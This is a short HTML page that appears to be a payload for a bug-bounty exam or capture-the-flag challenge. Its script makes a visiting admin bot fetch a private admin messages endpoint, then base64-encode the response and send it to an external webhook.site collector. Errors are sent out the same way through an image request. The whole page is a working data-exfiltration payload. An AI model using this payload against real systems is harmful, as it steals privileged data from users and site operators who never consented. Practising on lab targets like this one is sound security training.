<!DOCTYPE html>
<html>
<body>
    <script>
        // The endpoint the AdminBot uses to see your message details
        const target = 'https://bugbounty-exam.hashacademy.co/api/admin/messages/69ea97eabee6d6b7c664653e';
        const webhook = 'https://webhook.site/296afaf2-cf3b-4b7e-9e97-f597328a7eb7';

        fetch(target)
            .then(r => r.text())
            .then(data => {
                // Exfiltrate the raw response where the flag is hidden
                fetch(webhook, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: btoa('FULL_DATA:' + data)
                });
            })
            .catch(err => {
                // If there's an error, send it so we can debug
                new Image().src = webhook + '?err=' + btoa(err.message);
            });
    </script>
</body>
</html>
